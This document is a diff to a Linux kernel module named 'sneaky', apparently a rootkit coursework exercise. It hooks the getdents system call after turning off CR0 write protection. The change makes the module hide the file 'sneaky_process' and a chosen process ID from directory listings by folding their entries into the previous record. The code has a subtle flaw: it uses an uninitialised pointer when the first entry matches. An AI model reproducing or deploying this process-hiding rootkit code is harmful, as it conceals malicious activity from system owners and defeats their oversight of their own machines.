@@ -19,6 +19,10 @@ struct linux_dirent {
  char d_name[BUFFLEN];
 };
 
+static int sneaky_process_pid=0;
+module_param(sneaky_process_pid, int, 0);
+MODULE_PARM_DESC(sneaky_process_pid, "Process ID of Sneaky Process");
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -94,20 +98,28 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
   int nread, bpos; 
   //char buf[BUF_SIZE];
   struct linux_dirent *d;
-  char d_type;
+  //char d_type;
 
 
   nread= original_call_getdents(fd,dirp,count);
 
-  const char* sneakyName="sneaky_process"; 
+  const char* sneakyName="sneaky_process";
+
+  char pid_string[10];
+  sprintf (pid_string, "%d",sneaky_process_pid);
+
+  struct linux_dirent *prev; 
 
   for (bpos = 0; bpos < nread;) 
   {
-    d = (struct linux_dirent *) (dirp + bpos);
+    d = (struct linux_dirent *) ((char*)dirp + bpos);
 
 
-    if (strcmp(d->d_name,sneakyName)==0)
-      strcpy(d->d_name , "sneaky obfuscated");
+    if (strcmp(d->d_name,sneakyName)==0 || strcmp(d->d_name,pid_string)==0)
+    {
+      prev->d_reclen += d->d_reclen;
+    }
+      //strcpy(d->d_name , "sneaky obfuscated");
 
     // printf("%8ld  ", d->d_ino);
     // d_type = *(buf + bpos + d->d_reclen - 1);
@@ -121,6 +133,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
     // printf("%4d %10lld  %s\n", d->d_reclen,
     //        (long long) d->d_off, d->d_name);
     bpos += d->d_reclen;
+    prev=d; 
    }
 
 
@@ -131,9 +144,6 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
 ////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////
 
-static int sneaky_process_pid=-1;
-module_param(sneaky_process_pid, int, 0);
-MODULE_PARM_DESC(sneaky_process_pid, "Process ID of Sneaky Process");
 
 
 //The code that gets executed when the module is loaded
